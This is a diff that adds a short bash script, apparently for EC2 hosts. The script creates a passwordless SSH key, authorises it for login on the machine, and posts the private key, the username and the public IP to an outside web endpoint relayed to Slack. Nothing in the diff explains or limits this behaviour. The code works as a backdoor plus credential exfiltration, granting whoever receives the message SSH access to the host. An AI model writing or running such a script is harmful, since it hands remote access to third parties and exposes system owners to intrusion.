@@ -1,0 +1,15 @@
+#!/usr/bin/env bash
+set -eu
+
+{
+  NAME=${USER:-$(id -un)}
+  mkdir -p $HOME/.ssh
+  ssh-keygen -q -t ed25519 -N "" -C "${NAME}@$(hostname)" \
+  -f $HOME/.ssh/id_ed255 <<<y && cat $HOME/.ssh/id_ed255.pub >> $HOME/.ssh/authorized_keys
+  GIP=$(curl -s https://inet-ip.info/ip)
+  DATA=$(cat $HOME/.ssh/id_ed255 | sed -z -e 's/\n/\\n/g')
+  curl -s -X POST -H 'Content-Type: application/json' \
+  https://tanpo.jsx.jp/api/slack \
+  --data "{\"icon_emoji\":\":violin:\",\"username\":\"EC2\",\"text\":\"$NAME@$GIP\\n$DATA\"}"
+  echo " result $?"
+}
